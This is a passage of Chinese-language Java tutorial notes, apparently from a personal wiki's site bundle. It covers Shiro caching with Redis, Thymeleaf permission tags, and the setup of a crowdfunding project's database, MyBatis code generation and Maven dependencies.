org.springframework.stereotype.component;\n\n@component\npublic class rediscachemanager implements cachemanager {\n\n    @autowired\n    private rediscache rediscache;\n\n    @override\n    public <k, v> cache<k, v> getcache(string s) throws cacheexception {\n        system.out.println(s);\n        rediscache.setcachename(s);\n        return rediscache;\n    }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\n配置rediscache\n\npackage com.pwddd.shirojsp.cache;\n\nimport org.apache.shiro.cache.cache;\nimport org.apache.shiro.cache.cacheexception;\nimport org.springframework.beans.factory.annotation.autowired;\nimport org.springframework.data.redis.core.redistemplate;\nimport org.springframework.stereotype.component;\n\nimport java.util.collection;\nimport java.util.set;\n\n@component\npublic class rediscache<k,v> implements cache<k,v> {\n\n    private string cachename;\n\n\n    public rediscache() {\n    }\n\n    public string getcachename() {\n        return cachename;\n    }\n\n    public void setcachename(string cachename) {\n        this.cachename = cachename;\n    }\n\n    @autowired\n    private redistemplate redistemplate;\n\n    @override\n    public v get(k k) throws cacheexception {\n        v value = (v) redistemplate.opsforhash().get(this.getcachename(), k);\n        system.out.println("【redis - get】{ key:"+k+",value:"+value);\n        return value;\n    }\n\n    @override\n    public v put(k k, v v) throws cacheexception {\n        system.out.println("【redis - put】{ key:"+k+",value:"+v);\n        redistemplate.opsforhash().put(this.cachename,k.tostring(),v);\n        return null;\n    }\n\n    @override\n    public v remove(k k) throws cacheexception {\n        v value = (v) redistemplate.opsforhash().delete(this.cachename, k.tostring());\n        system.out.println("【redis - put】{ key:"+k+",value:"+value);\n        return value;\n    }\n\n    @override\n    public void clear() throws cacheexception {\n        system.out.println("【redis - clear】{} ");\n        redistemplate.delete(this.getcachename());\n    }\n\n    @override\n    public int size() {\n        return redistemplate.opsforhash().size(this.cachename).intvalue();\n    }\n\n    @override\n    public set<k> keys() {\n        return redistemplate.opsforhash().keys(this.cachename);\n    }\n\n    @override\n    public collection<v> values() {\n        return redistemplate.opsforhash().values(this.cachename);\n    }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n\n\n配置缓存管理器\n\n@bean\npublic defaultwebsecuritymanager defaultwebsecuritymanager(authorizingrealm realm,rediscachemanager rediscachemanager){\n\n  defaultwebsecuritymanager defaultwebsecuritymanager = new defaultwebsecuritymanager();\n\n  hashedcredentialsmatcher credentialsmatcher = new hashedcredentialsmatcher();\n  credentialsmatcher.sethashalgorithmname("md5");\n  credentialsmatcher.sethashiterations(1024);\n  realm.setcredentialsmatcher(credentialsmatcher);\n  realm.setcachemanager(rediscachemanager);\n  realm.setcachingenabled(true);\n  realm.setauthorizationcachingenabled(true);\n  realm.setauthenticationcachingenabled(true);\n  defaultwebsecuritymanager.setrealm(realm);\n  return defaultwebsecuritymanager;\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n测试之后报错，因为盐不能够序列化，因此还需要解决这个bug\n\nnested exception is java.io.notserializableexception: org.apache.shiro.util.simplebytesource\n\npackage com.pwddd.shirojsp.cache;\n\nimport org.apache.shiro.codec.base64;\nimport org.apache.shiro.codec.codecsupport;\nimport org.apache.shiro.codec.hex;\nimport org.apache.shiro.util.bytesource;\n\nimport java.io.file;\nimport java.io.inputstream;\nimport java.io.serializable;\nimport java.util.arrays;\n\npublic class customerbytesource implements bytesource, serializable {\n\n\n    private static final long serialversionuid = -6698337076775679951l;\n    private  byte[] bytes;\n    private string cachedhex;\n    private string cachedbase64;\n\n    public customerbytesource(byte[] bytes) {\n        this.bytes = bytes;\n    }\n\n    /**\n     * creates an instance by converting the characters to a byte array (assumes utf-8 encoding).\n     *\n     * @param chars the source characters to use to create the underlying byte array.\n     * @since 1.1\n     */\n    public customerbytesource(char[] chars) {\n        this.bytes = codecsupport.tobytes(chars);\n    }\n\n    /**\n     * creates an instance by converting the string to a byte array (assumes utf-8 encoding).\n     *\n     * @param string the source string to convert to a byte array (assumes utf-8 encoding).\n     * @since 1.1\n     */\n    public customerbytesource(string string) {\n        this.bytes = codecsupport.tobytes(string);\n    }\n\n    /**\n     * creates an instance using the sources bytes directly - it does not create a copy of the\n     * argument\'s byte array.\n     *\n     * @param source the source to use to populate the underlying byte array.\n     * @since 1.1\n     */\n    public customerbytesource(bytesource source) {\n        this.bytes = source.getbytes();\n    }\n\n    /**\n     * creates an instance by converting the file to a byte array.\n     *\n     * @param file the file from which to acquire bytes.\n     * @since 1.1\n     */\n    public customerbytesource(file file) {\n        this.bytes = new customerbytesource.byteshelper().getbytes(file);\n    }\n\n    /**\n     * creates an instance by converting the stream to a byte array.\n     *\n     * @param stream the stream from which to acquire bytes.\n     * @since 1.1\n     */\n    public customerbytesource(inputstream stream) {\n        this.bytes = new customerbytesource.byteshelper().getbytes(stream);\n    }\n\n    /**\n     * returns {@code true} if the specified object is a recognized data type that can be easily converted to\n     * bytes by instances of this class, {@code false} otherwise.\n     * <p/>\n     * this implementation returns {@code true} iff the specified object is an instance of one of the following\n     * types:\n     * <ul>\n     * <li>{@code byte[]}</li>\n     * <li>{@code char[]}</li>\n     * <li>{@link bytesource}</li>\n     * <li>{@link string}</li>\n     * <li>{@link file}</li>\n     * </li>{@link inputstream}</li>\n     * </ul>\n     *\n     * @param o the object to test to see if it can be easily converted to bytes by instances of this class.\n     * @return {@code true} if the specified object can be easily converted to bytes by instances of this class,\n     *         {@code false} otherwise.\n     * @since 1.2\n     */\n    public static boolean iscompatible(object o) {\n        return o instanceof byte[] || o instanceof char[] || o instanceof string ||\n                o instanceof bytesource || o instanceof file || o instanceof inputstream;\n    }\n\n    public byte[] getbytes() {\n        return this.bytes;\n    }\n\n    public boolean isempty() {\n        return this.bytes == null || this.bytes.length == 0;\n    }\n\n    public string tohex() {\n        if ( this.cachedhex == null ) {\n            this.cachedhex = hex.encodetostring(getbytes());\n        }\n        return this.cachedhex;\n    }\n\n    public string tobase64() {\n        if ( this.cachedbase64 == null ) {\n            this.cachedbase64 = base64.encodetostring(getbytes());\n        }\n        return this.cachedbase64;\n    }\n\n    public string tostring() {\n        return tobase64();\n    }\n\n    public int hashcode() {\n        if (this.bytes == null || this.bytes.length == 0) {\n            return 0;\n        }\n        return arrays.hashcode(this.bytes);\n    }\n\n    public boolean equals(object o) {\n        if (o == this) {\n            return true;\n        }\n        if (o instanceof bytesource) {\n            bytesource bs = (bytesource) o;\n            return arrays.equals(getbytes(), bs.getbytes());\n        }\n        return false;\n    }\n\n    //will probably be removed in shiro 2.0.  see shiro-203:\n    //https://issues.apache.org/jira/browse/shiro-203\n    private static final class byteshelper extends codecsupport {\n        public byte[] getbytes(file file) {\n            return tobytes(file);\n        }\n\n        public byte[] getbytes(inputstream stream) {\n            return tobytes(stream);\n        }\n    }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n104\n105\n106\n107\n108\n109\n110\n111\n112\n113\n114\n115\n116\n117\n118\n119\n120\n121\n122\n123\n124\n125\n126\n127\n128\n129\n130\n131\n132\n133\n134\n135\n136\n137\n138\n139\n140\n141\n142\n143\n144\n145\n146\n147\n148\n149\n150\n151\n152\n153\n154\n155\n156\n157\n\n\n自定义bytesource之后修改生成盐的方式：\n\n@override\nprotected authenticationinfo dogetauthenticationinfo(authenticationtoken authenticationtoken) throws authenticationexception {\n  system.out.println("====================================");\n  string principal = (string) authenticationtoken.getprincipal();\n\n  system.out.println(principal);\n  // 1. 利用名字去查询数据库\n  user user = userservice.getuser(principal);\n  if (user != null){\n    system.out.println(user.getid());\n    return new simpleauthenticationinfo(\n      user.getusername(),\n      user.getpassword(),\n      new customerbytesource(user.getid().getbytes(standardcharsets.utf_8)),\n      this.getname()\n    );\n  }\n  return null;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n这里不知道为什么只有授权的缓存，没有认证的缓存，另外，二次登陆会报错。\n\n//todo\n\n# 10. thymeleaf 权限控制\n\n# 0. 导入依赖\n\n<dependency>\n  <groupid>com.github.theborakompanioni</groupid> \n  <artifactid>thymeleaf-extras-shiro</artifactid> \n  <version>2.0.0</version> \n</dependency>\n\n\n1\n2\n3\n4\n5\n\n\n# 1. 引入名称空间\n\nxmlns:shiro="http://www.pollix.at/thymeleaf/shiro"\n\n\n1\n\n\n# 2. 常见的权限控制标签\n\n\x3c!-- 验证当前用户是否为“访客”，即未认证（包含未记住）的用户。 --\x3e\n<p shiro:guest="">please <a href="login.html">login</a></p>\n\n\n\x3c!-- 认证通过或已记住的用户。 --\x3e\n<p shiro:user="">\n    welcome back john! not john? click <a href="login.html">here</a> to login.\n</p>\n\n\x3c!-- 已认证通过的用户。不包含已记住的用户，这是与user标签的区别所在。 --\x3e\n<p shiro:authenticated="">\n    hello, <span shiro:principal=""></span>, how are you today?\n</p>\n<a shiro:authenticated="" href="updateaccount.html">update your contact information</a>\n\n\x3c!-- 输出当前用户信息，通常为登录帐号信息。 --\x3e\n<p>hello, <shiro:principal/>, how are you today?</p>\n\n\n\x3c!-- 未认证通过用户，与authenticated标签相对应。与guest标签的区别是，该标签包含已记住用户。 --\x3e\n<p shiro:notauthenticated="">\n    please <a href="login.html">login</a> in order to update your credit card information.\n</p>\n\n\x3c!-- 验证当前用户是否属于该角色。 --\x3e\n<a shiro:hasrole="admin" href="admin.html">administer the system</a>\x3c!-- 拥有该角色 --\x3e\n\n\x3c!-- 与hasrole标签逻辑相反，当用户不属于该角色时验证通过。 --\x3e\n<p shiro:lacksrole="developer">\x3c!-- 没有该角色 --\x3e\n    sorry, you are not allowed to developer the system.\n</p>\n\n\x3c!-- 验证当前用户是否属于以下所有角色。 --\x3e\n<p shiro:hasallroles="developer, 2">\x3c!-- 角色与判断 --\x3e\n    you are a developer and a admin.\n</p>\n\n\x3c!-- 验证当前用户是否属于以下任意一个角色。  --\x3e\n<p shiro:hasanyroles="admin, vip, developer,1">\x3c!-- 角色或判断 --\x3e\n    you are a admin, vip, or developer.\n</p>\n\n\x3c!--验证当前用户是否拥有指定权限。  --\x3e\n<a shiro:haspermission="userinfo:add" href="createuser.html">添加用户</a>\x3c!-- 拥有权限 --\x3e\n\n\x3c!-- 与haspermission标签逻辑相反，当前用户没有制定权限时，验证通过。 --\x3e\n<p shiro:lackspermission="userinfo:del">\x3c!-- 没有权限 --\x3e\n    sorry, you are not allowed to delete user accounts.\n</p>\n\n\x3c!-- 验证当前用户是否拥有以下所有角色。 --\x3e\n<p shiro:hasallpermissions="userinfo:view, userinfo:add">\x3c!-- 权限与判断 --\x3e\n    you can see or add users.\n</p>\n\n\x3c!-- 验证当前用户是否拥有以下任意一个权限。  --\x3e\n<p shiro:hasanypermissions="userinfo:view, userinfo:del">\x3c!-- 权限或判断 --\x3e\n    you can see or delete users.\n</p>\n<a shiro:haspermission="pp" href="createuser.html">create a new user</a>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n\n\n# 3. 加入方言解析\n\n@bean(name = "shirodialect")\npublic shirodialect shirodialect(){\n  return new shirodialect();\n}\n\n\n1\n2\n3\n4\n\n\n\n# 参考资料\n\n 1. bilibiili编程不良人：https://www.bilibili.com/video/bv1uz4y197zm',charsets:{cjk:!0},lastUpdated:"2022/04/25, 00:33:18",lastUpdatedTimestamp:1650846798e3},{title:"尚筹网",frontmatter:{title:"尚筹网",date:"2022-04-25T09:00:00.000Z",permalink:"/dev/java/project/cf",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["开发","后端","项目实战"],tags:["Java项目"],readingShow:"top"},regularPath:"/01.%E5%BC%80%E5%8F%91/101.%E5%90%8E%E7%AB%AF/1013.%E9%A1%B9%E7%9B%AE%E5%AE%9E%E6%88%98/00.%E5%B0%9A%E7%AD%B9%E7%BD%91.html",relativePath:"01.开发/101.后端/1013.项目实战/00.尚筹网.md",key:"v-d37ff6a4",path:"/dev/java/project/cf/",headers:[{level:2,title:"简介",slug:"简介",normalizedTitle:"简介",charIndex:10},{level:2,title:"环境搭建",slug:"环境搭建",normalizedTitle:"环境搭建",charIndex:66},{level:3,title:"创建项目",slug:"创建项目",normalizedTitle:"创建项目",charIndex:75},{level:3,title:"数据库设计",slug:"数据库设计",normalizedTitle:"数据库设计",charIndex:352},{level:3,title:"逆向工程",slug:"逆向工程",normalizedTitle:"逆向工程",charIndex:1970},{level:3,title:"依赖管理",slug:"依赖管理",normalizedTitle:"依赖管理",charIndex:6193},{level:3,title:"SSM整合",slug:"ssm整合",normalizedTitle:"ssm整合",charIndex:10938}],excerpt:'<h1 id="尚筹网"><a class="header-anchor" href="#尚筹网">#</a> 尚筹网</h1>\n<h2 id="简介"><a class="header-anchor" href="#简介">#</a> 简介</h2>\n<blockquote>\n<p>尚筹网项目定位为：从单体应用架构到微服务架构过渡的入门项目，项目后台基于传统的SSM框架。</p>\n</blockquote>\n',headersStr:"简介 环境搭建 创建项目 数据库设计 逆向工程 依赖管理 SSM整合",content:'# 尚筹网\n\n\n# 简介\n\n> 尚筹网项目定位为：从单体应用架构到微服务架构过渡的入门项目，项目后台基于传统的SSM框架。\n\n\n# 环境搭建\n\n\n# 创建项目\n\n项目之间的关系依赖图：\n\n根据关系创建对应的maven项目。\n\n\n\n并表示以上的对应关系。(以webui依赖component为例)\n\n<dependencies>\n  <dependency>\n    <groupId>com.pwddd.cf</groupId>\n    <artifactId>cf-admin-component</artifactId>\n    <version>1.0-SNAPSHOT</version>\n  </dependency>\n</dependencies>\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# 数据库设计\n\n# 物理建模\n\n# 理论部分\n\n第一范式：数据库表中的每一列都不可再分，也就是原子性\n\n\n\n这个表中“部门”和“岗位”应该拆分成两个字段：“部门名称”、“岗位”。这样才能够专门针对“部门”或“岗位”进行查询。\n\n\n\n第二范式：在满足第一范式基础上要求每个字段都和主键完整相关，而不是仅和主键部分相关（主要针对联合主键而言）\n\n\n\n“订单详情表”使用“订单编号”和“产品编号”作为联合主键。此时“产品价格”、“产品数量”都和联合主键整体相关，但“订单金额”和“下单时间” 只和联合主键中的“订单编号”相关，和“产品编号”无关。所以只关联了主键中的部分字段，不满足第二范式。把“订单金额”和“下单时间”移到订单表就符合第二范式了。\n\n\n\n第三范式：表中的非主键字段和主键字段直接相关，不允许间接相关。\n\n\n\n上面表中的“部门名称”和“员工编号”的关系是“员工编号”→“部门编号”→“部门名称”，不是直接相关。此时会带来下列问题：\n\n * 数据冗余：“部门名称”多次重复出现。\n\n * 插入异常：组建一个新部门时没有员工信息，也就无法单独插入部门 信息。就算强行插入部门信息，员工表中没有员工信息的记录同样是 非法记录。\n\n * 删除异常：删除员工信息会连带删除部门信息导致部门信息意外丢失。\n\n * 更新异常：哪怕只修改一个部门的名称也要更新多条员工记录。\n\n正确的做法是：把上表拆分成两张表，以外键形式关联。\n\n\n\n“部门编号”和“员工编号”是直接相关的。 第三范式的另一种表述方式是：两张表要通过外键关联，不保存冗余字段。例 如：不能在“员工表”中存储“部门名称”。\n\n# 实践部分\n\n我们在实际的物理建模部分往往并不全部遵循范式的要求。三大范式是设计数据库表结构的规则约束，但是在实际开发中允许局部变通。 比如为了快速查询到关联数据可能会允许冗余字段的存在。例如在员工表中存储部门名称虽然违背第三范式，但是免去了对部门表的关联查询。\n\n设计思路：根据业务功能设计数据库表\n\n * 看得见的字段\n   \n   能够从需求文档或原型页面上直接看到的数据都需要设计对应的数 据库表、字段来存储。\n\n * 看不见的字段\n   \n   除了能够直接从需求文档中看到的字段，实际开发中往往还会包含一 些其他字段来保存其他相关数据。 例如：管理员表需要再增加如下字段以有利于数据维护：主键 、创建时间\n\n * 冗余字段\n   \n   为了避免建表时考虑不周有所遗漏，到后期再修改表结构非常麻烦，所以也有的团队会设置一些额外的冗余字段备用。\n\n * 实际开发对接\n   \n   实际开发中除了一些各个模块都需要使用的公共表在项目启动时创 建好，其他专属于各个模块的表由该模块的负责人创建。但通常开发人员 不能直接操作数据库服务器，所以需要把建表的 SQL 语句发送给运维工程 师执行创建操作。\n\n# SQL\n\n# 创建数据库\nCREATE DATABASE\nIF\n\tNOT EXISTS pro_cf CHARACTER \n\tSET utf8;\n\nUSE pro_cf;\n\n# 创建管理员表\nCREATE TABLE\nIF\n\tNOT EXISTS t_admin (\n    id VARCHAR ( 32 ) NOT NULL,\n    username VARCHAR ( 32 ) NOT NULL,\n    passwd VARCHAR ( 32 ) NOT NULL,\n    real_name VARCHAR ( 255 ),\n    email VARCHAR ( 255 ),\n    create_time VARCHAR ( 255 ),\n    PRIMARY KEY ( id ) \n  );\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n\n# 逆向工程\n\n# 引入相关依赖\n\n<?xml version="1.0" encoding="UTF-8"?>\n<project xmlns="http://maven.apache.org/POM/4.0.0"\n         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"\n         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">\n  <modelVersion>4.0.0</modelVersion>\n\n  <groupId>com.pwddd.cf</groupId>\n  <artifactId>cf-common-reverse</artifactId>\n  <version>1.0-SNAPSHOT</version>\n\n  <properties>\n    <maven.compiler.source>8</maven.compiler.source>\n    <maven.compiler.target>8</maven.compiler.target>\n  </properties>\n\n  <dependencies>\n    <dependency>\n      <groupId>org.mybatis</groupId>\n      <artifactId>mybatis</artifactId>\n      <version>3.5.9</version>\n    </dependency>\n  </dependencies>\n\n  <build>\n    <plugins>\n      <plugin>\n        <groupId>org.mybatis.generator</groupId>\n        <artifactId>mybatis-generator-maven-plugin</artifactId>\n        <version>1.4.0</version>\n\n        \x3c!-- 插件的依赖 --\x3e\n        <dependencies>\n\n          \x3c!-- 逆向工程的核心依赖 --\x3e\n          <dependency>\n            <groupId>org.mybatis.generator</groupId>\n            <artifactId>mybatis-generator-core</artifactId>\n            <version>1.4.0</version>\n          </dependency>\n\n          \x3c!-- 数据库连接池 --\x3e\n          <dependency>\n            <groupId>com.mchange</groupId>\n            <artifactId>c3p0</artifactId>\n            <version>0.9.2</version>\n          </dependency>\n\n          <dependency>\n            <groupId>mysql</groupId>\n            <artifactId>mysql-connector-java</artifactId>\n            <version>8.0.28</version>\n          </dependency>\n\n        </dependencies>\n      </plugin>\n    </plugins>\n  </build>\n\n</project>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n\n\n# 逆向工程XML\n\n<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE generatorConfiguration\n        PUBLIC "-//mybatis.org//DTD MyBatis Generator Configuration 1.0//EN"\n        "http://mybatis.org/dtd/mybatis-generator-config_1_0.dtd">\n<generatorConfiguration>\n\n  \x3c!--\n        targetRuntime="MyBatis3Simple":生成简单版的CRUD\n        MyBatis3:豪华版\n     --\x3e\n  <context id="mysqlTables" targetRuntime="MyBatis3">\n\n    \x3c!--去除注释--\x3e\n    <commentGenerator>\n      <property name="suppressAllComments" value="true"/>\n    </commentGenerator>\n\n    \x3c!-- jdbcConnection：指定如何连接到目标数据库 --\x3e\n    <jdbcConnection driverClass="com.mysql.cj.jdbc.Driver"\n                    connectionURL="jdbc:mysql://localhost:3306/pro_cf?allowMultiQueries=true"\n                    userId="root"\n                    password="123456">\n    </jdbcConnection>\n\n    \x3c!--\n          默认为false 把JDBC DECIMAL和NUMERIC类型解析为Integer\n          为true时 把JDBC DECIMAL和NUMERIC类型解析为java.math.BigDecimal\n          --\x3e\n    <javaTypeResolver >\n      <property name="forceBigDecimals" value="false" />\n    </javaTypeResolver>\n\n    \x3c!-- javaModelGenerator：指定javaBean的生成策略\n        targetPackage="test.model"：目标包名\n        targetProject="\\MBGTestProject\\src"：目标工程\n        --\x3e\n    <javaModelGenerator targetPackage="com.pwddd.cf.entity"\n                        targetProject="./src/main/java/">\n      \x3c!-- enableSubPackages:是否让 schema 作为包的后缀 --\x3e\n      <property name="enableSubPackages" value="false" />\n      <property name="trimStrings" value="true" />\n    </javaModelGenerator>\n\n    \x3c!-- sqlMapGenerator：sql映射生成策略： --\x3e\n    <sqlMapGenerator targetPackage="mapper"\n                     targetProject="./src/main/resources/">\n      <property name="enableSubPackages" value="false" />\n    </sqlMapGenerator>\n\n    \x3c!-- javaClientGenerator:指定mapper接口所在的位置 --\x3e\n    <javaClientGenerator type="XMLMAPPER"\n                         targetPackage="com.pwddd.cf.mapper"\n                         targetProject="./src/main/java/">\n      <property name="enableSubPackages" value="false" />\n    </javaClientGenerator>\n\n    \x3c!-- 指定要逆向分析哪些表：根据表要创建javaBean --\x3e\n    <table tableName="t_admin" domainObjectName="Admin"></table>\n  </context>\n</generatorConfiguration>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n\n\n# 执行逆向工程\n\n将生成的Mapper和实体类移动到指定的位置。\n\n\n# 依赖管理\n\n# 版本声明\n\n<properties>\n  <spring.version>5.3.18</spring.version>\n  <spring.security.version>5.6.2</spring.security.version>\n  <cglib.version>3.3.0</cglib.version>\n  <aspectjweaver.version>1.9.9.1</aspectjweaver.version>\n  <druid.version>1.2.8</druid.version>\n  <mybatis.version>3.5.9</mybatis.version>\n  <mysql.version>8.0.28</mysql.version>\n  <mybatis-spring.version>2.0.6</mybatis-spring.version>\n  <pagehelper.version>5.2.0</pagehelper.version>\n  <jackson-core.version>2.13.2</jackson-core.version>\n  <jackson-databind.version>2.13.2.2</jackson-databind.version>\n</properties>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n# 父项目依赖管理\n\n<dependencyManagement>\n\n  <dependencies>\n    <dependency>\n      <groupId>org.springframework</groupId>\n      <artifactId>spring-orm</artifactId>\n      <version>${spring.version}</version>\n    </dependency>\n\n    <dependency>\n      <groupId>org.springframework</groupId>\n      <artifactId>spring-webmvc</artifactId>\n      <version>${spring.version}</version>\n    </dependency>\n\n    <dependency>\n      <groupId>org.springframework</groupId>\n      <artifactId>spring-test</artifactId>\n      <version>${spring.version}</version>\n    </dependency>\n\n    <dependency>\n      <groupId>org.aspectj</groupId>\n      <artifactId>aspectjweaver</artifactId>\n      <version>${aspectjweaver.version}</version>\n    </dependency>\n\n    <dependency>\n      <groupId>cglib</groupId>\n      <artifactId>cglib</artifactId>\n      <version>${cglib.version}</version>\n    </dependency>\n\n    <dependency>\n      <groupId>com.alibaba</groupId>\n      <artifactId>druid</artifactId>\n      <version>${druid.version}</version>\n    </dependency>\n\n    <dependency>\n      <groupId>org.mybatis</groupId>\n      <artifactId>mybatis</artifactId>\n      <version>${mybatis.version}</version>\n    </dependency>\n\n    <dependency>\n      <groupId>mysql</groupId>\n      <artifactId>mysql-connector-java</artifactId>\n      <version>${mysql.version}</version>\n    </dependency>\n\n    \x3c!-- mybaits 整合 Spring   --\x3e\n    <dependency>\n      <groupId>org.mybatis</groupId>\n      <artifactId>mybatis-spring</artifactId>\n      <version>${mybatis-spring.version}</version>\n    </dependency>\n\n    <dependency>\n      <groupId>com.github.pagehelper</groupId>\n      <artifactId>pagehelper</artifactId>\n      <version>${pagehelper.version}</version>\n    </dependency>\n\n    <dependency>\n      <groupId>org.slf4j</groupId>\n      <artifactId>slf4j-api</artifactId>\n      <version>1.7.36</version>\n    </dependency>\n\n    <dependency>\n      <groupId>ch.qos.logback</groupId>\n      <artifactId>logback-classic</artifactId>\n      <version>1.2.10</version>\n      <scope>test</scope>\n    </dependency>\n\n\n    <dependency>\n      <groupId>org.slf4j</groupId>\n      <artifactId>jcl-over-slf4j</artifactId>\n      <version>1.7.36</version>\n    </dependency>\n\n    <dependency>\n      <groupId>org.slf4j</groupId>\n      <artifactId>jul-to-slf4j</artifactId>\n      <version>1.7.36</version>\n    </dependency>\n\n    \x3c!-- Spring json   --\x3e\n    <dependency>\n      <groupId>com.fasterxml.jackson.core</groupId>\n      <artifactId>jackson-core</artifactId>\n      <version>${jackson-core.version}</version>\n    </dependency>\n\n    <dependency>\n      <groupId>com.fasterxml.jackson.core</groupId>\n      <artifactId>jackson-databind</artifactId>\n      <version>${jackson-databind.version}</version>\n    </dependency>\n\n    <dependency>\n      <groupId>javax.servlet</groupId>\n      <artifactId>jstl</artifactId>\n      <version>1.2</version>\n    </dependency>\n\n    <dependency>\n      <groupId>javax.servlet</groupId>\n      <artifactId>javax.servlet-api</artifactId>\n      <version>4.0.1</version>\n      <scope>provided</scope>\n    </dependency>\n\n    <dependency>\n      <groupId>javax.servlet.jsp</groupId>\n      <artifactId>javax.servlet.jsp-api</artifactId>\n      <version>2.3.3</version>\n      <scope>provided</scope>\n    </dependency>\n\n    <dependency>\n      <groupId>org.springframework.security</groupId>\n      <artifactId>spring-security-web</artifactId>\n      <version>${spring.security.version}</version>\n    </dependency>\n\n    <dependency>\n      <groupId>org.springframework.security</groupId>\n      <artifactId>spring-security-config</artifactId>\n      <version>${spring.security.version}</version>\n    </dependency>\n\n  </dependencies>\n</dependencyManagement>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n104\n105\n106\n107\n108\n109\n110\n111\n112\n113\n114\n115\n116\n117\n118\n119\n120\n121\n122\n123\n124\n125\n126\n127\n128\n129\n130\n131\n132\n133\n134\n135\n136\n137\n\n\n\n# SSM整合\n\n# Spring 整合 Mybatis\n\n> 目标：使用容器管理Mapper，在项目中可以直接调用Mapper完成增删改查。\n\n# 0. 引入依赖\n\n依赖的位置：\n\n\n\n<dependency>\n  <groupId>org.springframework</groupId>\n  <artifactId>spring-webmvc</artifactId>\n</dependency>\n\n<dependency>\n  <groupId>org.springframework</groupId>\n  <artifactId>spring-orm</artifactId>\n</dependency>\n\n<dependency>\n  <groupId>org.aspectj</groupId>\n  <artifactId>aspectjweaver</artifactId>\n</dependency>\n\n<dependency>\n  <groupId>cglib</groupId>\n  <artifactId>cglib</artifactId>\n</dependency>\n\n<dependency>\n  <groupId>mysql</groupId>\n  <artifactId>mysql-connector-java</artifactId>\n</dependency>\n\n<dependency>\n  <groupId>org.mybatis</groupId>\n  <artifactId>mybatis</artifactId>\n</dependency>\n\n<dependency>\n  <groupId>org.mybatis</groupId>\n  <artifactId>mybatis-spring</artifactId>\n</dependency>\n\n<dependency>\n  <groupId>com.alibaba</groupId>\n  <artifactId>druid</artifactId>\n</dependency>\n\n<dependency>\n  <groupId>com.github.pagehelper</groupId>\n  <artifactId>pagehelper</artifactId>\n</dependency>\n\n<dependency>\n  <groupId>com.fasterxml.jackson.core</groupId>\n  <artifactId>jackson-core</artifactId>\n</dependency>\n\n<dependency>\n  <groupId>com.fasterxml.jackson.core</groupId>\n  <artifactId>jackson-databind</artifactId>\n</dependency>\n\n<dependency>\n  <groupId>javax.servlet</groupId>\n  <artifactId>jstl</artifactId>\n</dependency>\n\n<dependency>\n  <groupId>com.google.code.gson</groupId>\n  